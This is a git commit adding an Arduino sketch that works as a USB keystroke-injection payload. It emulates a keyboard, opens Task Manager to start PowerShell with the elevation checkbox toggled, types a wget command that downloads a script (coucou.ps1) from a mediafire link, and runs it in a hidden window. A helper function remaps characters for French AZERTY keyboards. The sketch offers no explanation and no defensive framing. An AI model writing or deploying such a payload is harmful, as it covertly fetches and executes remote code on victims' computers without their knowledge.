871a381a9097569ac14ccd67b426f9eb4e83e267
Alex7833 <62905495+Alex7833@users.noreply.github.com>
2021-01-01 13:52:16 +0100

    Add files via upload

---
+++ Arduino_Payload/Arduino_Payload.ino
@@ -0,0 +1,62 @@
+#include <Keyboard.h>
+#include <stdlib.h>
+
+void setup(){
+  delay(800);
+  runCmd(fr2en("taskmgr")+"\n");
+  delay(1500);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.releaseAll();
+  delay(200);
+  Keyboard.print("f");   
+  Keyboard.print("n");
+  delay(300);
+  String french = "powershell.exe";
+  String uk = fr2en(french);
+  Keyboard.print(uk);
+  delay(300);
+  Keyboard.press(KEY_TAB);
+  Keyboard.releaseAll();
+  Keyboard.press(32);
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+  String text = "wget https://download1653.mediafire.com/j6k2npugru4g/27bg76hqihhierk/coucou.ps1 -O coucou.ps1";
+  String text_en = fr2en(text);
+  Keyboard.print(text_en + "\n");
+  delay(1000);
+  String var_text = "PowerShell.exe -windowstyle hidden {powershell -noexit coucou.ps1}";
+  String text_fr = fr2en(var_text);
+  Keyboard.print(text_fr + "\n");
+  Keyboard.releaseAll();
+}
+
+String fr2en(String text){
+  int i = 0;
+  String _en = " =qwertyuiopasdfghjkl;zxcvbnQWERTYUIOPASDFGHJKL:ZXCVBNm,./M<>?1234567890!@#$%^&*()",
+         _fr = " =azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN,;:!?./ & \"'(- _  1234567890",
+         str = "";
+  while (text[i] != 0){
+    str = str + (String)_en[_fr.indexOf((String)text[i++])];
+  }
+  return str;
+}
+
+void runCmd(String cmd){
+  int i = 0;
+  Keyboard.begin();
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(1000);
+  while (cmd[i] != 0){
+    Keyboard.write(cmd[i++]);
+    delay(50);
+  }
+}
+
+
+void loop(){
+}
